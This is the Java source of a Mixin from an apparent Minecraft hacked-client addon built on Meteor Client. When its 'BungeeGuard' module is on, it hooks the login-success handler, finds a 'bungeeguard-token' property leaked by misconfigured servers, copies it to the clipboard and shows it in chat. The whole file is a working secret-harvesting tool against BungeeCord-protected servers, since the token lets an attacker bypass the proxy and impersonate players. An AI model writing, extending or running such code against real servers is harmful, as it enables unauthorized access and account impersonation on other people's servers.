package com.x310.clarity.mixin;

import com.mojang.authlib.properties.Property;
import com.mojang.authlib.properties.PropertyMap;
import com.x310.clarity.features.modules.impl.BungeeGuard;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientLoginNetworkHandler;
import net.minecraft.network.packet.s2c.login.LoginSuccessS2CPacket;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.util.Timer;
import java.util.TimerTask;


@Mixin(ClientLoginNetworkHandler.class)
public class LoginHandlerMixin {
    public void copyToClipboard(String token) {
        if (token != null && token.matches("^[a-zA-Z0-9]+$")) {
            Toolkit.getDefaultToolkit().getSystemClipboard();
            Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
            StringSelection data = new StringSelection(token);
            cb.setContents(data, null);
        } else {
            System.err.println("Invalid Token Rejected");
        }
    }

    @Inject(method = "onSuccess", at = @At("HEAD"))
    public void onSuccess(LoginSuccessS2CPacket packet, CallbackInfo ci) {
        if (Modules.get().get(BungeeGuard.class).isActive()) {
            System.out.println("Mixin injected into onSuccess()");
            PropertyMap map = packet.profile().getProperties();

            Property tokenProperty = null;
            for (Property property : map.values()) {
                if (property.name().equals("bungeeguard-token")) {
                    tokenProperty = property;
                    break;
                }
            }

            String message;

            if (tokenProperty != null) {
                String token = tokenProperty.value();
                copyToClipboard(token);
                message = "§c[§6B§eu§an§3g§9e§5e§cG§6u§ea§ar§3d§9]§r Token found: " + token;
            } else {
                message = "§c[§6B§eu§an§3g§9e§5e§cG§6u§ea§ar§3d§9]§r No token found";
            }

            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    MinecraftClient.getInstance().execute(() ->
                        MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(Text.of(message)));
                }
            }, 3000);
        }
    }
}
